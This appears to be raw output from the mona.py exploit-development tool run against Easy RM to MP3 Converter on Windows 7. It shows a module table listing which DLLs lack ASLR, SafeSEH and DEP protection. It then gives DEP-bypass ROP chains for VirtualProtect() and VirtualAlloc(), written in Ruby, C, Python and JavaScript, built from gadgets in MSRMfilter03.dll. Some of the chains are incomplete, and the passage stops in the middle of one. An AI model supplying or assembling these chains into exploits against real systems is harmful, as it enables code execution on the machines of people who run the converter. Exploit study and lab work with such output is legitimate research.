-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x10000000 | 0x10071000 | 0x00071000 | False  | False   | False |  False   | False  | -1.0- [MSRMfilter03.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter03.dll)
 0x757f0000 | 0x757fc000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\Windows\system32\MSASN1.dll)
 0x741a0000 | 0x741b3000 | 0x00013000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x705a0000 | 0x705d8000 | 0x00038000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [odbcint.dll] (C:\Windows\system32\odbcint.dll)
 0x74880000 | 0x748b1000 | 0x00031000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [EhStorShell.dll] (C:\Windows\system32\EhStorShell.dll)
 0x73c60000 | 0x73c6a000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [slc.dll] (C:\Windows\system32\slc.dll)
 0x76fe0000 | 0x76fea000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x77160000 | 0x7735b000 | 0x001fb000 | True   | True    | True  |  True    | True   | 8.00.7601.17514 [iertutil.dll] (C:\Windows\system32\iertutil.dll)
 0x745c0000 | 0x746b5000 | 0x000f5000 | True   | True    | True  |  True    | True   | 7.00.7600.16385 [PROPSYS.dll] (C:\Windows\system32\PROPSYS.dll)
 0x75660000 | 0x7567b000 | 0x0001b000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\system32\SspiCli.dll)
 0x73850000 | 0x73857000 | 0x00007000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x76dc0000 | 0x76f1c000 | 0x0015c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x770f0000 | 0x77147000 | 0x00057000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SHLWAPI.dll] (C:\Windows\system32\SHLWAPI.dll)
 0x75e80000 | 0x75f49000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\system32\USER32.dll)
 0x714b0000 | 0x714bb000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [CSCAPI.dll] (C:\Windows\system32\CSCAPI.dll)
 0x74050000 | 0x7414b000 | 0x000fb000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [WindowsCodecs.dll] (C:\Windows\system32\WindowsCodecs.dll)
 0x76000000 | 0x76c4a000 | 0x00c4a000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x743e0000 | 0x743e9000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [CSCDLL.dll] (C:\Windows\System32\CSCDLL.dll)
 0x777d0000 | 0x77853000 | 0x00083000 | True   | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x751c0000 | 0x751fc000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\System32\mswsock.dll)
 0x73fe0000 | 0x74012000 | 0x00032000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x75950000 | 0x75977000 | 0x00027000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\Windows\system32\CFGMGR32.dll)
 0x75080000 | 0x750c4000 | 0x00044000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [dnsapi.DLL] (C:\Windows\system32\dnsapi.DLL)
 0x60350000 | 0x6037b000 | 0x0002b000 | True   | True    | True  |  True    | False  | 8.00.7601.17514 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll)
 0x70fc0000 | 0x71026000 | 0x00066000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [MSVCP60.dll] (C:\Windows\system32\MSVCP60.dll)
 0x75b20000 | 0x75c56000 | 0x00136000 | True   | True    | True  |  True    | True   | 8.00.7600.16385 [urlmon.dll] (C:\Windows\system32\urlmon.dll)
 0x73db0000 | 0x73dc0000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [NLAapi.dll] (C:\Windows\system32\NLAapi.dll)
 0x75680000 | 0x756cc000 | 0x0004c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x76c50000 | 0x76d24000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x756d0000 | 0x756dc000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x77630000 | 0x7776c000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x01480000 | 0x014f1000 | 0x00071000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec00.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll)
 0x77000000 | 0x77019000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x02ae0000 | 0x02fad000 | 0x004cd000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec02.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec02.dll)
 0x012c0000 | 0x012d0000 | 0x00010000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter02.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter02.dll)
 0x75d50000 | 0x75e45000 | 0x000f5000 | True   | True    | True  |  True    | True   | 8.00.7600.16385 [WININET.dll] (C:\Windows\system32\WININET.dll)
 0x76ff0000 | 0x76ff5000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\system32\PSAPI.DLL)
 0x77360000 | 0x773db000 | 0x0007b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x73b30000 | 0x73b3d000 | 0x0000d000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [rtutils.dll] (C:\Windows\system32\rtutils.dll)
 0x01550000 | 0x015ef000 | 0x0009f000 | True   | False   | False |  False   | False  | -1.0- [MSRMfilter01.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMfilter01.dll)
 0x70400000 | 0x70410000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [napinsp.dll] (C:\Windows\system32\napinsp.dll)
 0x71fe0000 | 0x72032000 | 0x00052000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RASAPI32.dll] (C:\Windows\system32\RASAPI32.dll)
 0x73710000 | 0x73725000 | 0x00015000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rasman.dll] (C:\Windows\system32\rasman.dll)
 0x60bc0000 | 0x60bd6000 | 0x00016000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [thumbcache.dll] (C:\Windows\system32\thumbcache.dll)
 0x746e0000 | 0x7487e000 | 0x0019e000 | True   | True    | True  |  True    | True   | 6.10 [comctl32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll)
 0x703d0000 | 0x703d8000 | 0x00008000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [winrnr.dll] (C:\Windows\System32\winrnr.dll)
 0x77020000 | 0x770ec000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x74c80000 | 0x74c89000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\system32\VERSION.dll)
 0x75770000 | 0x7577e000 | 0x0000e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75c60000 | 0x75cae000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x003e0000 | 0x003e7000 | 0x00007000 | True   | False   | False |  False   | False  | -1.0- [MSRMCcodec01.dll] (C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec01.dll)
 0x74520000 | 0x74560000 | 0x00040000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x700f0000 | 0x70141000 | 0x00051000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINSPOOL.DRV] (C:\Windows\system32\WINSPOOL.DRV)
 0x75780000 | 0x7578b000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x75830000 | 0x7594d000 | 0x0011d000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPT32.dll] (C:\Windows\system32\CRYPT32.dll)
 0x75f50000 | 0x75ffc000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x70580000 | 0x70591000 | 0x00011000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [MSVCIRT.dll] (C:\Windows\system32\MSVCIRT.dll)
 0x012a0000 | 0x012be000 | 0x0001e000 | True   | False   | False |  False   | False  | 1.0.1.8 [wmatimer.dll] (C:\Program Files\Easy RM to MP3 Converter\wmatimer.dll)
 0x6c540000 | 0x6c65c000 | 0x0011c000 | True   | True    | True  |  True    | True   | 6.06.8063.0 [MFC42.DLL] (C:\Windows\system32\MFC42.DLL)
 0x73780000 | 0x737d8000 | 0x00058000 | True   | True    | True  |  True    | False  | 6.1.7600.16385 [tiptsf.dll] (C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll)
 0x711f0000 | 0x71274000 | 0x00084000 | True   | True    | True  |  True    | True   | 5.82 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.17514_none_ec83dffa859149af\COMCTL32.dll)
 0x75200000 | 0x75216000 | 0x00016000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x60090000 | 0x600ec000 | 0x0005c000 | True   | True    | True  |  True    | True   | 7.00.7601.17514 [StructuredQuery.dll] (C:\Windows\System32\StructuredQuery.dll)
 0x6cd80000 | 0x6ce0c000 | 0x0008c000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [ODBC32.dll] (C:\Windows\system32\ODBC32.dll)
 0x743f0000 | 0x7445a000 | 0x0006a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [cscui.dll] (C:\Windows\System32\cscui.dll)
 0x738a0000 | 0x738a6000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sensapi.dll] (C:\Windows\system32\sensapi.dll)
 0x741c0000 | 0x7420e000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [actxprxy.dll] (C:\Windows\system32\actxprxy.dll)
 0x77150000 | 0x77156000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x77770000 | 0x777b5000 | 0x00045000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WLDAP32.dll] (C:\Windows\system32\WLDAP32.dll)
 0x75a10000 | 0x75a5a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x76f20000 | 0x76fc0000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ADVAPI32.dll] (C:\Windows\system32\ADVAPI32.dll)
 0x77490000 | 0x7762d000 | 0x0019d000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SETUPAPI.dll] (C:\Windows\system32\SETUPAPI.dll)
 0x75a80000 | 0x75ab5000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.dll] (C:\Windows\system32\WS2_32.dll)
 0x6d5b0000 | 0x6e030000 | 0x00a80000 | True   | True    | True  |  True    | True   | 8.00.7600.16385 [ieframe.DLL] (C:\Windows\system32\ieframe.DLL)
 0x00400000 | 0x004be000 | 0x000be000 | False  | False   | False |  False   | False  | 2.7.3.700 [RM2MP3Converter.exe] (C:\Program Files\Easy RM to MP3 Converter\RM2MP3Converter.exe)
 0x73860000 | 0x7387c000 | 0x0001c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [iphlpapi.DLL] (C:\Windows\system32\iphlpapi.DLL)
 0x754a0000 | 0x754b9000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [srvcli.dll] (C:\Windows\system32\srvcli.dll)
 0x751b0000 | 0x751b6000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [wship6.dll] (C:\Windows\System32\wship6.dll)
 0x621c0000 | 0x62260000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SearchFolder.dll] (C:\Windows\system32\SearchFolder.dll)
 0x703e0000 | 0x703f2000 | 0x00012000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [pnrpnsp.dll] (C:\Windows\system32\pnrpnsp.dll)
 0x74d10000 | 0x74d15000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [wshtcpip.dll] (C:\Windows\System32\wshtcpip.dll)
 0x74020000 | 0x74041000 | 0x00021000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x012d0000 | 0x012e2000 | 0x00012000 | True   | False   | False |  False   | False  | -1.0- [MSLog.dll] (C:\Program Files\Easy RM to MP3 Converter\MSLog.dll)
 0x74260000 | 0x7428e000 | 0x0002e000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SHDOCVW.dll] (C:\Windows\system32\SHDOCVW.dll)
 0x75cb0000 | 0x75d4d000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x70800000 | 0x70806000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rasadhlp.dll] (C:\Windows\system32\rasadhlp.dll)
 0x73570000 | 0x735a8000 | 0x00038000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [fwpuclnt.dll] (C:\Windows\System32\fwpuclnt.dll)
 0x75630000 | 0x75638000 | 0x00008000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [Secur32.dll] (C:\Windows\System32\Secur32.dll)
 0x75a60000 | 0x75a72000 | 0x00012000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\Windows\system32\DEVOBJ.dll)
 0x74fa0000 | 0x74fdb000 | 0x0003b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x76d30000 | 0x76dbf000 | 0x0008f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x773e0000 | 0x77481000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x76fc0000 | 0x76fdf000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x742a0000 | 0x74310000 | 0x00070000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntshrui.dll] (C:\Windows\system32\ntshrui.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x100280a2,  # POP EBP # RETN [MSRMfilter03.dll] 
      0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x100118df,  # POP EBX # RETN [MSRMfilter03.dll] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1002d6c5,  # POP EDX # RETN [MSRMfilter03.dll] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x10001d9e,  # POP ECX # RETN [MSRMfilter03.dll] 
      0x1005ceba,  # &Writable location [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100067bf,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x10024a09,  # RETN (ROP NOP) [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10029822,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x00000000,  // [-] Unable to find API pointer -> eax
      0x1002e0c8,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [MSRMfilter03.dll] 
      0x1001a788,  // PUSH EAX // POP ESI // POP EBP // MOV EAX,1 // POP EBX // POP ECX // RETN [MSRMfilter03.dll] 
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_ebp:---]
      0x100280a2,  // POP EBP // RETN [MSRMfilter03.dll] 
      0x1001b058,  // & push esp // ret  [MSRMfilter03.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x100118df,  // POP EBX // RETN [MSRMfilter03.dll] 
      0x00000201,  // 0x00000201-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x1002d6c5,  // POP EDX // RETN [MSRMfilter03.dll] 
      0x00000040,  // 0x00000040-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x10001d9e,  // POP ECX // RETN [MSRMfilter03.dll] 
      0x1005ceba,  // &Writable location [MSRMfilter03.dll]
      //[---INFO:gadgets_to_set_edi:---]
      0x100067bf,  // POP EDI // RETN [MSRMfilter03.dll] 
      0x10024a09,  // RETN (ROP NOP) [MSRMfilter03.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x10029822,  // POP EAX // RETN [MSRMfilter03.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x00000000,  // [-] Unable to find pushad gadget
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x100280a2,  # POP EBP # RETN [MSRMfilter03.dll] 
      0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x100118df,  # POP EBX # RETN [MSRMfilter03.dll] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x1002d6c5,  # POP EDX # RETN [MSRMfilter03.dll] 
      0x00000040,  # 0x00000040-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x10001d9e,  # POP ECX # RETN [MSRMfilter03.dll] 
      0x1005ceba,  # &Writable location [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x100067bf,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x10024a09,  # RETN (ROP NOP) [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x10029822,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax
    "%ue0c8%u1002" + // 0x1002e0c8 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
    "%ua788%u1001" + // 0x1001a788 : ,# PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u80a2%u1002" + // 0x100280a2 : ,# POP EBP # RETN [MSRMfilter03.dll] 
    "%ub058%u1001" + // 0x1001b058 : ,# & push esp # ret[MSRMfilter03.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u18df%u1001" + // 0x100118df : ,# POP EBX # RETN [MSRMfilter03.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%ud6c5%u1002" + // 0x1002d6c5 : ,# POP EDX # RETN [MSRMfilter03.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u1d9e%u1000" + // 0x10001d9e : ,# POP ECX # RETN [MSRMfilter03.dll] 
    "%uceba%u1005" + // 0x1005ceba : ,# &Writable location [MSRMfilter03.dll]
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u67bf%u1000" + // 0x100067bf : ,# POP EDI # RETN [MSRMfilter03.dll] 
    "%u4a09%u1002" + // 0x10024a09 : ,# RETN (ROP NOP) [MSRMfilter03.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%u9822%u1002" + // 0x10029822 : ,# POP EAX # RETN [MSRMfilter03.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x1002d61a,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x10032078,  # ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
      0x1002e0c8,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [MSRMfilter03.dll] 
      0x1001a788,  # PUSH EAX # POP ESI # POP EBP # MOV EAX,1 # POP EBX # POP ECX # RETN [MSRMfilter03.dll] 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ebp:---]
      0x10027d2c,  # POP EBP # RETN [MSRMfilter03.dll] 
      0x1001b058,  # & push esp # ret  [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x1000a0fa,  # POP EBX # RETN [MSRMfilter03.dll] 
      0x00000001,  # 0x00000001-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x100288f8,  # POP EDX # RETN [MSRMfilter03.dll] 
      0x00001000,  # 0x00001000-> edx
      #[---INFO:gadgets_to_set_ecx:---]
      0x100034ea,  # POP ECX # RETN [MSRMfilter03.dll] 
      0x00000040,  # 0x00000040-> ecx
      #[---INFO:gadgets_to_set_edi:---]
      0x1002c309,  # POP EDI # RETN [MSRMfilter03.dll] 
      0x10024a09,  # RETN (ROP NOP) [MSRMfilter03.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x1002a86b,  # POP EAX # RETN [MSRMfilter03.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00000000,  # [-] Unable to find pushad gadget
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x1002d61a,  // POP EAX // RETN [MSRMfilter03.dll] 
      0x10032078,  // ptr to &VirtualAlloc() [IAT MSRMfilter03.dll]
      0x1002e0c8,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [MSRMfilter03.dll] 
      0x1001a788,  // PUSH EAX // POP ESI // POP EBP // MOV EAX,1 // POP EBX // POP ECX // RETN [MSRMfilter03.dll] 
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      //[---INFO:gadgets_to_set_ebp:---]
      0x10027d2c,  // POP EBP // RETN [MSRMfilter03.dll] 
      0x1001b058,  // & push esp // ret  [MSRMfilter03.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x1000a0fa,  // POP EBX // RETN [MSRMfilter03.dll] 
      0x00000001,  // 0x00000001-> ebx
      //[---INFO:gadgets_to_set_edx:---]
      0x100288f8,  // POP EDX // RETN [MSRMfilter03.dll] 
      0x00001000,  // 0x00001000-> edx
      //[---INFO:gadgets_to_set_ecx:---]
      0x100034ea,  // POP ECX // RETN [MSRMfilter03.dll] 
      0x00000040,  // 0x00000040-> ecx
      //[---INFO:gadgets_to_set_edi:---]
      0x1002c309,  // POP EDI // RETN [MSRMfilter03.dll] 
